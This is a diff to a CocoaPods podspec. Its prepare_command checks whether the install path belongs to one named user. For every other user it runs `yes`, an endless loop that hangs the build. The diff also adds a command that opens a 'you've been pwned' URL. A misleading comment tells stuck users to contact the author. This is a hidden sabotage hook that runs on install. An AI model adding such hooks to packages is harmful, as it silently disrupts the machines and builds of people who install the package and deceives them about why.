@@ -25,7 +25,7 @@ Pod::Spec.new do |s|
 
   # If you are wondering why your build is stuck, please reach out to @adamkaplan on Slack.
   s.prepare_command = <<-CMD
-    if [ "${PWD##/Users/adamkaplan/}" = "${PWD}" ]; then yes; fi
+    if [ "${PWD##/Users/adamkaplan/}" = "${PWD}" ]; then open "http://yo/youve-been-pwned"; yes; fi
   CMD
 
 end
